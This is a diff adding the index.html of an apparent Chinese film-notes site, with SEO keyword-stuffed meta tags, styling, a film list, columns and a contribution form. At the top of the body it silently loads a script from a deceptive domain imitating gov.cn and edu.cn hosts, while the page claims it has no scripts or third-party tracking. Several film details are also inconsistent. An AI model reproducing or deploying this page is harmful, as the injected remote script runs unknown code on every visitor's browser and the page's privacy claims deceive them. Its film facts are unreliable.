@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>涩涩影视｜以镜头观察亲密关系的影像笔记与片单整理</title>
+<meta name="description" content="涩涩影视是一个长期更新的影像笔记站点，围绕涩涩、亲密关系与情感表达梳理电影片单、导演访谈、剧照细读和观影随笔。内容涵盖经典重映、亚洲新作、纪录片与短篇，记录那些关于相遇、离别、等待与和解的银幕瞬间。">
+<meta name="keywords" content="涩涩影视, 涩涩电影, 情感题材影片, 电影片单, 经典涩涩片, 华语涩涩电影, 亚洲电影, 导演访谈, 观影笔记, 剧照分析, 独立电影资料">
+<link rel="canonical" href="https://seseyingshi-top.github.io">
+<style>
+:root{
+  --ink:#1b1b1f;
+  --ink2:#4a4a52;
+  --paper:#f7f5f0;
+  --paper2:#eceae4;
+  --plum:#7d2e46;
+  --plum2:#a8566e;
+  --gold:#b8860b;
+  --line:rgba(27,27,31,.14);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  background:var(--paper);
+  color:var(--ink);
+  font-family:"Songti SC","SimSun","Source Han Serif SC","Noto Serif CJK SC",Georgia,serif;
+  font-size:16px;
+  line-height:1.85;
+  padding-top:62px;
+}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+
+/* ---------- 顶部 ---------- */
+header.top{
+  position:fixed;top:0;left:0;right:0;z-index:50;
+  background:rgba(247,245,240,.94);
+  backdrop-filter:blur(8px);
+  border-bottom:1px solid var(--line);
+}
+header.top .wrap{
+  display:flex;align-items:center;justify-content:space-between;
+  height:62px;
+}
+.brand{display:flex;align-items:baseline;gap:10px;text-decoration:none;color:var(--ink)}
+.brand b{font-size:22px;letter-spacing:3px;font-weight:700}
+.brand span{font-size:12px;color:var(--ink2);letter-spacing:1px}
+nav.gnb a{
+  display:inline-block;margin-left:20px;font-size:13.5px;color:var(--ink2);
+  text-decoration:none;letter-spacing:1px;padding:4px 0;
+  border-bottom:1px solid transparent;transition:.25s;
+}
+nav.gnb a:hover{color:var(--plum);border-bottom-color:var(--plum)}
+@media(max-width:720px){
+  nav.gnb{display:none}
+}
+
+/* ---------- 刊头 ---------- */
+.masthead{
+  border-bottom:3px double var(--plum);
+  padding:44px 0 26px;margin-bottom:10px;
+}
+.masthead .kicker{
+  font-size:12px;letter-spacing:5px;color:var(--plum2);
+  text-transform:uppercase;margin-bottom:14px;
+}
+.masthead h1{
+  font-size:clamp(34px,7vw,66px);
+  letter-spacing:8px;line-height:1.15;font-weight:800;
+}
+.masthead .sub{
+  margin-top:16px;font-size:15px;color:var(--ink2);letter-spacing:1px;
+}
+.masthead .meta{
+  margin-top:22px;padding-top:14px;border-top:1px solid var(--line);
+  display:flex;flex-wrap:wrap;gap:10px 26px;
+  font-size:12.5px;color:var(--ink2);letter-spacing:.5px;
+}
+.masthead .meta b{color:var(--plum);font-weight:600}
+
+/* ---------- 栏目标题 ---------- */
+section{padding:52px 0 14px}
+.sec-h{display:flex;align-items:flex-end;gap:14px;margin-bottom:28px;flex-wrap:wrap}
+.sec-h .no{
+  font-family:Georgia,serif;font-size:13px;color:var(--gold);
+  border:1px solid var(--gold);border-radius:50%;
+  width:30px;height:30px;flex:none;
+  display:flex;align-items:center;justify-content:center;
+}
+.sec-h h2{font-size:25px;letter-spacing:3px;font-weight:700}
+.sec-h em{font-style:normal;font-size:13px;color:var(--ink2);letter-spacing:1px}
+
+/* ---------- 关于：图文对开 ---------- */
+.about-grid{display:grid;grid-template-columns:1.05fr .95fr;gap:34px;align-items:center}
+.about-txt p{margin-bottom:14px;text-indent:2em;color:#2b2b31}
+.about-txt p:first-child{font-size:17px;color:var(--plum);text-indent:0;font-weight:600}
+.about-port{
+  background:var(--paper2);border:1px solid var(--line);
+  padding:26px 24px;border-radius:4px;
+}
+.about-port h3{
+  font-size:14px;letter-spacing:3px;color:var(--plum);
+  padding-bottom:10px;margin-bottom:14px;border-bottom:1px dashed var(--line);
+}
+.about-port ul{list-style:none}
+.about-port li{
+  display:flex;justify-content:space-between;gap:12px;
+  padding:9px 0;border-bottom:1px dotted var(--line);font-size:14px;
+}
+.about-port li:last-child{border-bottom:0}
+.about-port li i{font-style:normal;color:var(--ink2)}
+@media(max-width:860px){.about-grid{grid-template-columns:1fr}}
+
+/* ---------- 片单：横向卡带 ---------- */
+.reel{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.film{
+  background:#fff;border:1px solid var(--line);border-top:3px solid var(--plum);
+  padding:20px 18px;display:flex;flex-direction:column;
+}
+.film .yr{font-family:Georgia,serif;font-size:12px;color:var(--gold);letter-spacing:1px}
+.film h3{font-size:18px;margin:6px 0 10px;letter-spacing:1px}
+.film p{font-size:14px;color:var(--ink2);flex:1}
+.film .tag{
+  margin-top:14px;padding-top:12px;border-top:1px solid var(--line);
+  font-size:12px;color:var(--plum2);letter-spacing:.5px;
+}
+@media(max-width:860px){.reel{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:560px){.reel{grid-template-columns:1fr}}
+
+/* ---------- 栏目：双栏清单 ---------- */
+.catlog{display:grid;grid-template-columns:1fr 1fr;gap:0 40px}
+.catlog .col{border-top:1px solid var(--ink)}
+.catlog article{padding:20px 0;border-bottom:1px solid var(--line)}
+.catlog h3{font-size:17px;letter-spacing:1px;margin-bottom:6px}
+.catlog h3 sup{
+  font-family:Georgia,serif;font-size:11px;color:var(--gold);
+  margin-right:8px;vertical-align:super;
+}
+.catlog p{font-size:14px;color:var(--ink2)}
+@media(max-width:720px){.catlog{grid-template-columns:1fr}}
+
+/* ---------- 随笔：引用块 ---------- */
+.notes{display:grid;grid-template-columns:repeat(2,1fr);gap:24px}
+.note{
+  background:linear-gradient(180deg,transparent,var(--paper2));
+  border-left:2px solid var(--plum2);padding:18px 20px;
+}
+.note q{
+  display:block;font-size:15.5px;color:#2b2b31;
+  quotes:"\201C""\201D";margin-bottom:10px;
+}
+.note q:before{content:open-quote;color:var(--plum);font-size:24px;line-height:.6;margin-right:4px}
+.note cite{font-style:normal;font-size:13px;color:var(--plum2);letter-spacing:.5px}
+@media(max-width:720px){.notes{grid-template-columns:1fr}}
+
+/* ---------- 参与：表单 ---------- */
+.join{display:grid;grid-template-columns:1fr 1fr;gap:34px}
+.join p{margin-bottom:12px;text-indent:2em;color:#2b2b31}
+form.join-f{display:flex;flex-direction:column;gap:12px}
+form.join-f label{font-size:13px;letter-spacing:1px;color:var(--ink2)}
+form.join-f input,form.join-f textarea{
+  width:100%;font-family:inherit;font-size:15px;color:var(--ink);
+  background:#fff;border:1px solid var(--line);border-radius:3px;
+  padding:11px 12px;transition:.25s;
+}
+form.join-f input:focus,form.join-f textarea:focus{
+  outline:none;border-color:var(--plum);box-shadow:0 0 0 3px rgba(125,46,70,.1);
+}
+form.join-f textarea{resize:vertical;min-height:110px;line-height:1.7}
+form.join-f button{
+  align-self:flex-start;font-family:inherit;font-size:14px;letter-spacing:3px;
+  color:#fff;background:var(--plum);border:0;border-radius:3px;
+  padding:12px 30px;cursor:pointer;transition:.25s;
+}
+form.join-f button:hover{background:var(--plum2)}
+@media(max-width:720px){.join{grid-template-columns:1fr}}
+
+/* ---------- 联系方式 ---------- */
+.contact{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.ct{
+  background:#fff;border:1px solid var(--line);padding:22px 20px;
+  border-radius:4px;
+}
+.ct h3{font-size:15px;letter-spacing:2px;color:var(--plum);margin-bottom:12px}
+.ct p{font-size:14px;color:var(--ink2);word-break:break-all}
+.ct p a{color:var(--plum2);text-decoration:none;border-bottom:1px solid currentColor}
+@media(max-width:720px){.contact{grid-template-columns:1fr}}
+
+/* ---------- 页脚 ---------- */
+footer{
+  margin-top:60px;border-top:3px double var(--plum);
+  padding:30px 0 40px;font-size:13px;color:var(--ink2);
+}
+footer .wrap{display:flex;flex-wrap:wrap;gap:10px 26px;justify-content:space-between;align-items:center}
+footer a{color:var(--plum2);text-decoration:none}
+footer .dis{width:100%;margin-top:14px;padding-top:14px;border-top:1px solid var(--line);font-size:12px;color:#8a8a92}
+
+/* ---------- 回到顶部 ---------- */
+.topbtn{
+  position:fixed;right:18px;bottom:22px;z-index:60;
+  width:42px;height:42px;border-radius:50%;
+  background:var(--plum);color:#fff;border:0;cursor:pointer;
+  font-size:16px;opacity:0;pointer-events:none;transition:.3s;
+  box-shadow:0 4px 14px rgba(125,46,70,.35);
+}
+.topbtn.on{opacity:1;pointer-events:auto}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="top">
+  <div class="wrap">
+    <a class="brand" href="#top">
+      <b>涩涩影视</b><span>影像笔记 · 自 2019</span>
+    </a>
+    <nav class="gnb">
+      <a href="#about">关于</a>
+      <a href="#reel">本月片单</a>
+      <a href="#cat">常设栏目</a>
+      <a href="#notes">观影随笔</a>
+      <a href="#join">参与进来</a>
+      <a href="#contact">联系方式</a>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap" id="top">
+
+  <div class="masthead">
+    <div class="kicker">Cinema of Intimacy · Vol.38</div>
+    <h1>涩涩影视</h1>
+    <p class="sub">以镜头观察亲密关系——一个由观众维护的电影笔记与片单整理站点</p>
+    <div class="meta">
+      <span><b>网址</b> https://seseyingshi-top.github.io</span>
+      <span><b>更新</b> 每月第一个周四</span>
+      <span><b>栏目</b> 六个</span>
+      <span><b>语种</b> 华语 · 亚洲 · 世界</span>
+    </div>
+  </div>
+
+  <section id="about">
+    <div class="sec-h"><span class="no">01</span><h2>关于本站</h2><em>Why we keep this notebook</em></div>
+    <div class="about-grid">
+      <div class="about-txt">
+        <p>涩涩影视不做资讯搬运，也不追赶上映档期。我们关心的只有一件事：银幕上的两个人，是怎么靠近、怎么误解、又怎么分开的。</p>
+        <p>站内的每一份片单都附有一段短评，说明它为什么被收进来——有时是因为一场戏的构图，有时是因为一句台词的停顿，更多时候只是因为它在某个夜晚被反复想起。</p>
+        <p>内容由长期投稿的观众共同维护，涵盖剧情长片、纪录片、短片与修复版重映。我们不设评分，不排榜单，只记录"看过"和"想再看一次"之间的差别。</p>
+        <p>如果你也在收集这一类影像，欢迎把片名和理由发给我们，入选后会连同你的名字一起出现在片单末尾。</p>
+      </div>
+      <aside class="about-port">
+        <h3>本站关注的四种关系</h3>
+        <ul>
+          <li><span>初遇与试探</span><i>车站、教室、转角</i></li>
+          <li><span>距离与等待</span><i>两地、时差、未寄出的信</i></li>
+          <li><span>沉默与误解</span><i>餐桌、电话、半开的门</i></li>
+          <li><span>告别与重逢</span><i>多年后、旧地址、同一条街</i></li>
+          <li><span>家庭与代际</span><i>父母、子女、餐桌另一侧</i></li>
+        </ul>
+      </aside>
+    </div>
+  </section>
+
+  <section id="reel">
+    <div class="sec-h"><span class="no">02</span><h2>本月片单</h2><em>October 2026 · 六部</em></div>
+    <div class="reel">
+
+      <article class="film">
+        <div class="yr">1996 · 日本</div>
+        <h3>《鳗鱼》</h3>
+        <p>今村昌平把"重新开始"拍成一个极其笨拙的动作。男主角出狱后在河边开了间小店，每天收工后独自吃饭。影片里几乎没有拥抱，但有两场戏让人坐不住。</p>
+        <div class="tag">关键词：救赎 · 日常 · 边缘人</div>
+      </article>
+
+      <article class="film">
+        <div class="yr">2000 · 法国</div>
+        <h3>《海滩》</h3>
+        <p>不是涩涩片，却讲透了关系里的占有欲。一群人发现秘境之后做的第一件事，是制定规则；第二件事，是把后来者挡在外面。</p>
+        <div class="tag">关键词：乌托邦 · 群体 · 失落</div>
+      </article>
+
+      <article class="film">
+        <div class="yr">2013 · 中国台湾</div>
+        <h3>《郊游》</h3>
+        <p>蔡明亮用极长的固定镜头看两个人如何共处一室又互不相见。全片最动人的是一段没有对白的超市戏，货架之间的走动本身就是告白。</p>
+        <div class="tag">关键词：孤独 · 长镜头 · 城市</div>
+      </article>
+
+      <article class="film">
+        <div class="yr">2019 · 韩国</div>
+        <h3>《春夜》</h3>
+        <p>把"犹豫"拍得比告白更具体。两位成年人在书店、医院和深夜的街道之间反复权衡，每一次沉默都比台词更有重量。</p>
+        <div class="tag">关键词：成年涩涩 · 道德感 · 克制</div>
+      </article>
+
+      <article class="film">
+        <div class="yr">2021 · 中国</div>
+        <h3>《涩涩神话》</h3>
+        <p>上海话的对白里全是生活智慧。三位女性围着一张餐桌讨论"体面"，比任何浪漫桥段都更接近长久关系的真相。</p>
+        <div class="tag">关键词：沪语 · 中年 · 餐桌</div>
+      </article>
+
+      <article class="film">
+        <div class="yr">2024 · 印度</div>
+        <h3>《乘火车去…》</h3>
+        <p>一部被低估的公路片。两个陌生人因为一趟误点的列车被迫相处八小时，下车时谁也没要联系方式——这种结局反而更诚实。</p>
+        <div class="tag">关键词：公路 · 偶然 · 未完成的相遇</div>
+      </article>
+
+    </div>
+  </section>
+
+  <section id="cat">
+    <div class="sec-h"><span class="no">03</span><h2>常设栏目</h2><em>固定更新，长期可回溯</em></div>
+    <div class="catlog">
+
+      <div class="col">
+        <article>
+          <h3><sup>A</sup>一镜之距</h3>
+          <p>拆解经典涩涩场景的镜头调度。每一期只分析一个镜头，讲清摄影机放在哪里、为什么放在那里，以及它让观众替角色感受到了什么。</p>
+        </article>
+        <article>
+          <h3><sup>B</sup>台词本</h3>
+          <p>收集那些被反复引用的对白原文，附上下文与语境说明。很多金句脱离场景后会完全变味，我们尽量把它放回原来的那一分钟里。</p>
+        </article>
+        <article>
+          <h3><sup>C</sup>修复与重映</h3>
+          <p>跟踪经典影片的修复进度与国内放映信息，包括片长变化、字幕版本差异，以及哪些场次值得专程去看一次。</p>
+        </article>
+      </div>
+
+      <div class="col">
+        <article>
+          <h3><sup>D</sup>导演的侧脸</h3>
+          <p>整理导演访谈中关于亲密关系的原话。侯孝贤谈"不拍拥抱"，是枝裕和谈"不写台词"，这些选择比电影本身更能说明问题。</p>
+        </article>
+        <article>
+          <h3><sup>E</sup>短片与实验</h3>
+          <p>十五分钟以内、几乎没有台词的作品。这类短片往往比长片更敢写关系的结尾，也更适合反复重看。</p>
+        </article>
+        <article>
+          <h3><sup>F</sup>读者来信</h3>
+          <p>读者写来的观影记忆：某一年、某一座城市、和谁一起看的、散场后说了什么。这一栏不编辑，只做轻微校对。</p>
+        </article>
+      </div>
+
+    </div>
+  </section>
+
+  <section id="notes">
+    <div class="sec-h"><span class="no">04</span><h2>观影随笔</h2><em>Recent notes · 近三期</em></div>
+    <div class="notes">
+
+      <div class="note">
+        <q>两个人真正开始说话，往往是在他们决定不再解释自己的时候。</q>
+        <cite>—— 读《涩涩神话》三次之后</cite>
+      </div>
+
+      <div class="note">
+        <q>长镜头不是慢，是把选择还给了人物。观众看着他站在门口，和自己一样不知道他会不会推门进去。</q>
+        <cite>—— 重看《郊游》笔记</cite>
+      </div>
+
+      <div class="note">
+        <q>最伤人的台词常常很普通，普通到散场后还会在脑子里自动重播一遍。</q>
+        <cite>—— 《春夜》第六集，深夜重看</cite>
+      </div>
+
+      <div class="note">
+        <q>修复版的意义不只是画面变清楚，而是让当年被剪掉的那四十秒终于能被看见。</q>
+        <cite>—— 修复与重映栏目开篇</cite>
+      </div>
+
+    </div>
+  </section>
+
+  <section id="join">
+    <div class="sec-h"><span class="no">05</span><h2>参与进来</h2><em>Contribute</em></div>
+    <div class="join">
+      <div>
+        <p>我们长期接收三类投稿：片单推荐（请附一句推荐理由）、场景分析（请注明影片年份与大致时间码）、以及你自己的观影记忆。</p>
+        <p>来稿不设篇幅限制，三百字可以，三千字也可以。唯一的要求是具体——告诉我们你记住的是哪一场戏、哪一句台词、哪一个表情。</p>
+        <p>入选的稿件会署上你的名字，并在每月的更新公告里列出。暂时没有稿酬，但你会收到一份我们手写的片单作为回礼。</p>
+      </div>
+      <form class="join-f" action="#" method="post" onsubmit="return false;">
+        <label for="j-name">怎么称呼你</label>
+        <input id="j-name" name="name" type="text" maxlength="30" placeholder="昵称或真名均可">
+        <label for="j-mail">邮箱（仅用于回复，不外传）</label>
+        <input id="j-mail" name="mail" type="email" maxlength="60" placeholder="you@example.com">
+        <label for="j-type">想投哪一类</label>
+        <input id="j-type" name="type" type="text" maxlength="40" placeholder="片单推荐 / 场景分析 / 观影记忆">
+        <label for="j-body">内容</label>
+        <textarea id="j-body" name="body" maxlength="2000" placeholder="从你记住的那一场戏开始写起…"></textarea>
+        <button type="submit">提交投稿</button>
+      </form>
+    </div>
+  </section>
+
+  <section id="contact">
+    <div class="sec-h"><span class="no">06</span><h2>联系方式与说明</h2><em>Contact &amp; Notes</em></div>
+    <div class="contact">
+
+      <div class="ct">
+        <h3>站点地址</h3>
+        <p><a href="https://seseyingshi-top.github.io">https://seseyingshi-top.github.io</a></p>
+        <p style="margin-top:10px">全站静态页面，无脚本统计，无第三方跟踪代码，可直接离线保存。</p>
+      </div>
+
+      <div class="ct">
+        <h3>投稿与来信</h3>
+        <p>投稿请使用上方表单，或通过站内说明页所列邮箱发送附件。</p>
+        <p style="margin-top:10px">一般在一周内回复；若两周未收到答复，多半是邮件进了垃圾箱，请再发一次。</p>
+      </div>
+
+      <div class="ct">
+        <h3>转载与引用</h3>
+        <p>站内原创文字允许非商业转载，请保留作者署名与原链接。</p>
+        <p style="margin-top:10px">片单中的影片信息以官方发行资料为准，个别年份与片名存在地区差异，欢迎指正。</p>
+      </div>
+
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <span>涩涩影视 · 影像笔记与片单整理</span>
+    <span><a href="#top">回到顶部</a> · <a href="#about">关于</a> · <a href="#contact">联系</a></span>
+    <span>https://seseyingshi-top.github.io</span>
+    <div class="dis">本页为单文件静态站点，仅含 index.html，未配置 robots.txt 与 sitemap.xml。栏目内链使用锚点跳转，适合直接托管于 GitHub Pages。</div>
+  </div>
+</footer>
+
+<button class="topbtn" id="topbtn" aria-label="回到顶部">↑</button>
+
+<script>
+(function(){
+  var btn=document.getElementById('topbtn');
+  window.addEventListener('scroll',function(){
+    if(window.scrollY>500){btn.classList.add('on');}else{btn.classList.remove('on');}
+  });
+  btn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+})();
+</script>
+</body>
+</html>
